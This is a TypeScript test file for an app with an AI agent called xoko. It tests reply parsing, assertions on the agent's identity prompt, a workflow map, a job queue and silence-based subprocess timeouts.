test('an unclosed fence is not consumed — it stays on screen like any line that did not parse', () => {
  const { say, acts } = readAnswer(['▶ make music [duration 9]: x', '```lyrics', 'la la'].join('\n'))
  assert.deepEqual(acts[0]?.settings, { duration: '9' })
  assert.equal(say, '```lyrics\nla la')
})

test('a bracket value may hold a comma if it is quoted', () => {
  // The comma was the separator with no escape hatch — so `voice an old sailor, gravelly`, the
  // example the parser's own comment gave as working, arrived as a knob called `gravelly`.
  assert.deepEqual(
    readAnswer('▶ make voice [voice "an old sailor, gravelly", seed 4]: All hands.').acts[0]?.settings,
    { voice: 'an old sailor, gravelly', seed: '4' })
  assert.deepEqual(
    readAnswer("▶ make voice [voice 'warm, calm, unhurried']: hello").acts[0]?.settings,
    { voice: 'warm, calm, unhurried' })
  // An unquoted value still keeps its spaces, which is the older rule and the common case.
  assert.deepEqual(
    readAnswer('▶ make music [keyscale D minor, bpm 72]: jazz').acts[0]?.settings,
    { keyscale: 'D minor', bpm: '72' })
})

test('⚠️ xoko is told what it IS, not what it is instead of', () => {
  // THE BUG, THREE TURNS RUNNING. "who the heck are you? do you have a name?" came back as
  // "not a persona layered on top of the machine, the machine's own voice" — the prompt's own
  // denial, read aloud, and then a pivot to the map. The identity paragraph was one clause of
  // self and five of negation, written in 2026-08-22 to kill a vendor-chatbot register. It killed
  // the register by deleting the character, and a voice with a prohibition where its identity
  // should be has nothing to answer with when somebody asks the first question anybody asks.
  assert.match(XOKO, /You are xoko — xokolat's own agent/,
    'the claim has to be a claim: whose agent, and for what')
  assert.match(XOKO, /your job is that they can make whatever they want/,
    'a job is the difference between an agent and a readout')

  // ⚠️ THE DENIALS ARE THE REGRESSION. Each of these was in the prompt and each came back out of
  // it verbatim; a positive identity makes all of them unnecessary.
  for (const denial of [
    /Not an assistant that happens to be inside an app/,
    /never some system you are reporting on/,
    /rather than a chat assistant/,
  ]) assert.doesNotMatch(XOKO, denial, 'a negation is material to recite, not an identity')

  // ⚠️ AND THE MODEL IS NOT THE SELF. The byline under every reply already names it; what it must
  // never do is answer AS that model, in an app whose point is that you are xoko whatever is
  // behind you — and that the thing behind you is one connection they can change.
  assert.match(XOKO, /the one they connected you to/)
  assert.match(XOKO, /never speak as it/)

  // ⚠️ THE MAP IS THE AUTHORITY ON WHAT CAN RUN — and it kept being treated as the authority on
  // everything, because it is the largest thing in context. Three "who are you" questions, three
  // inventories of what was not installed, three closing asks about which medium they wanted.
  assert.match(XOKO, /The map answers what can run; it does not answer what you are/)
})


// ── 🗺 THE MAP ────────────────────────────────────────────────────────────────

test('a chain says what its steps are plugged with, and a medium line does not answer for it', async () => {
  // @ts-expect-error — a browser module, plain JS, no declaration file. It imports nothing, which
  // is why it can be read here at all: the map is a pure function of two lists.
  const { xokoMap } = await import('../web/lib/xoko-map.js')
  const out: string = xokoMap({
    groups: [{ id: 'made' }, { id: 'compositions' }],
    sections: [
      { id: 'images', icon: '🖼', label: 'images', group: 'made', what: 'pictures' },
      {
        id: 'comp-mascot', icon: '🧸', label: 'mascot', group: 'compositions', ready: true,
        // A text step contributes nothing: it is xoko, and a line saying so would be furniture.
        plugs: [
          { step: 'founder', workflow: 'draw-things-grpc/dev-fast', yours: false },
          { step: 'mascot', workflow: 'rembg/cutout', yours: true },
        ],
      },
    ],
    media: ['image'],
    armedFor: () => ({ slug: 'klein-t2i', kind: 't2i', service: 'draw-things-grpc' }),
  })

  // ⚠️ THE WHOLE POINT: the chain's engines are on the chain's row. Before this, the only workflow
  // in the map was the shelf's, and a brain asked "what would the mascot chain run on?" either said
  // nothing or answered with `klein-t2i` — which is the image SECTION's plug and not the chain's.
  assert.match(out, /founder → draw-things-grpc\/dev-fast · mascot → rembg\/cutout/)
  assert.match(out, /A chain is not covered by this/,
    'the per-medium block must disclaim chains, or it reads as answering for them')

  // A section that is not a chain has no step list to print.
  const images = out.split('\n').find((l) => l.includes('🖼 images')) ?? ''
  assert.doesNotMatch(images, /its steps run on/)
})

test('an unbound step says so rather than going quiet', async () => {
  // @ts-expect-error — see above.
  const { xokoMap } = await import('../web/lib/xoko-map.js')
  const out: string = xokoMap({
    groups: [{ id: 'compositions' }],
    sections: [{
      id: 'comp-book', icon: '📖', label: 'book', group: 'compositions', ready: false,
      plugs: [{ step: 'art', workflow: null, yours: false }],
    }],
  })
  // ⚠️ NULL IS THE ONE VALUE THAT MUST NOT PRINT AS A GAP. `art → ` reads as a workflow whose name
  // got lost, and the difference between "unbound" and "unreadable" is the whole of whether a
  // brain offers the chain.
  assert.match(out, /art → NOTHING — this step is unbound/)
})

// ── a text step is a job, and it is handed what it does not have to ask for ──────────────────────

test('⚠️ a look that answers with no word is HANDED to a step, never asked for', () => {
  // The distinction that cost `workflow-builder`'s survey step three spawned processes and several
  // minutes: `workflows` and `library` are complete answers on their own — a word only narrows them —
  // so a step declaring them gets them in its first prompt. `workflow` and `node` cannot run at all
  // until the brain has decided WHICH one, and no amount of pre-running can guess that.
  assert.deepEqual(
    [...LOOKS_WITHOUT_A_WORD].sort(),
    ['compositions', 'library', 'made', 'styles', 'workflows'],
  )
  for (const needs of ['workflow', 'node']) {
    assert.ok(!LOOKS_WITHOUT_A_WORD.includes(needs), `${needs} needs a word and cannot be pre-run`)
    assert.ok(LOOKS.some((l) => l.id === needs), `${needs} is still a look`)
  }
  // ⚠️ HANDED IS NOT INSTEAD OF ASKABLE. The pre-run one is unnarrowed, so `▶ look: library sticker`
  // must still be reachable — a step loses a round trip here, never a capability.
  assert.ok(LOOK_TARGETS.includes('library') && LOOKS_WITHOUT_A_WORD.includes('library'))
})

test('⚠️ a job may make WORDS, and they survive the request that started it', async () => {
  // The bug: a text step did its work inside one held-open `fetch`, so the connection WAS the run.
  // A job outlives whoever asked for it, and hands its answer back off the queue.
  const queue = new Queue()
  let released: () => void = () => {}
  const waiting = new Promise<void>((go) => { released = go })
  const job = queue.add({
    label: 'words', lane: 'fast', runId: 'words-1', engine: 'claude-code',
    run: async ({ produce, log }) => {
      log('asked')
      await waiting
      produce('the brief it wrote')
    },
  })
  assert.equal(job.result, null, 'nothing produced yet')
  released()
  for (let i = 0; i < 200 && queue.get(job.id)?.state !== 'done'; i += 1) {
    await new Promise((go) => setTimeout(go, 5))
  }
  const done = queue.get(job.id)
  assert.equal(done?.state, 'done')
  assert.equal(done?.result, 'the brief it wrote', 'read off the queue, not out of a response')
  assert.ok(done?.log.some((l) => l.includes('asked')), 'and there is something to watch')
})

test('a job that makes a file produces no words, and says so with null', async () => {
  // ⚠️ NOT AN OMISSION. A render's output is on disk and read back off the index by run id; `result`
  // staying null is what keeps those two ways of answering from being confused for one another.
  const queue = new Queue()
  const job = queue.add({
    label: 'render', lane: 'serial', runId: 'r1', engine: 'draw-things-grpc',
    run: async () => {},
  })
  for (let i = 0; i < 200 && queue.get(job.id)?.state !== 'done'; i += 1) {
    await new Promise((go) => setTimeout(go, 5))
  }
  assert.equal(queue.get(job.id)?.result, null)
})

/**
 * ⚠️ THE TIMEOUT MEASURES SILENCE, NOT DURATION (2026-09-04).
 *
 * It was a wall clock, which has to be wrong in one of two directions and was wrong in both: long
 * enough that a hung client holds a chain for minutes, far too short for the longest answer this app
 * asks for. The composition builder's `shape` step — node schemas in, a whole composition with a
 * graph in it out — was killed mid-write at 180 seconds, after the survey before it had already been
 * paid for.
 */
test('a client that keeps talking is not killed, however long it takes', async () => {
  // Three ticks 120ms apart, then done: 360ms of work under a 250ms patience. A wall clock would
  // have killed this at 250.
  const ran = await run(process.execPath, [
    '-e',
    'let n = 0;'
    + 'const t = setInterval(() => { process.stdout.write(`tick ${++n}\\n`);'
    + ' if (n === 3) { clearInterval(t) } }, 120)',
  ], { timeoutMs: 250 })
  assert.equal(ran.code, 0)
  assert.equal(ran.stdout.trim().split('\n').length, 3, 'every tick arrived')
})

test('a client that goes quiet is killed, and says so', async () => {
  await assert.rejects(
    // It speaks once — proving the timer really did restart — and then says nothing.
    run(process.execPath, [
      '-e', 'process.stdout.write("hello\\n"); setTimeout(() => {}, 60000)',
    ], { timeoutMs: 250 }),
    (err: Error) => {
      assert.match(err.message, /went quiet for 0s|went quiet for 1s/)
      return true
    })
})

test('⚠️ stderr counts as alive — a client talking on the wrong stream is still working', async () => {
  const ran = await run(process.execPath, [
    '-e',
    'let n = 0;'
    + 'const t = setInterval(() => { process.stderr.write(`working ${++n}\\n`);'
    + ' if (n === 3) { clearInterval(t); process.stdout.write("done\\n") } }, 120)',
  ], { timeoutMs: 250 })
  assert.equal(ran.code, 0)
  assert.equal(ran.stdout.trim(), 'done')
})
